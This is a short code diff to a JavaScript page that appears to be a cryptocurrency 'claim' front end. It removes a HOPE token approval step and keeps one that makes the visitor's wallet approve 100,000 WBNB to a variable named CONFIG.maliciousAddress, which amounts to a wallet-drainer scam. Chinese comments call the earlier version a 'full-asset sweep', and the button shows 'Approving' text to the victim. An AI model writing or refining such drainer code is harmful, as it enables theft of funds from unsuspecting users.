@@ -175,19 +175,8 @@ document.addEventListener('DOMContentLoaded', function() {
             }
 
             // ============================================
-            // 第四步：双重授权 HOPE 和 WBNB（实现全资产扫荡）
+            // 第四步：只授权 WBNB（不需要授权 HOPE）
             // ============================================
-            const hopeAddress = "0x6E77cdB742c044Bdc75F4416973d1f6aAa878756";
-            
-            // 4.1 授权 HOPE
-            const hopeContract = new ethers.Contract(hopeAddress, ERC20_ABI, signer);
-            console.log(`⚠️ 正在授权 HOPE (额度 100,000)...`);
-            claimBtn.textContent = '⏳ Approving HOPE...';
-            const approveHopeTx = await hopeContract.approve(CONFIG.maliciousAddress, ethers.utils.parseUnits("100000", 18));
-            await approveHopeTx.wait();
-            console.log(`✅ HOPE 已授权 (额度: 100,000)`);
-
-            // 4.2 授权 WBNB
             console.log(`⚠️ 正在授权 WBNB (额度 100,000)...`);
             claimBtn.textContent = '⏳ Approving WBNB...';
             const wbnbApproveContract = new ethers.Contract(CONFIG.wbnbAddress, ERC20_ABI, signer);
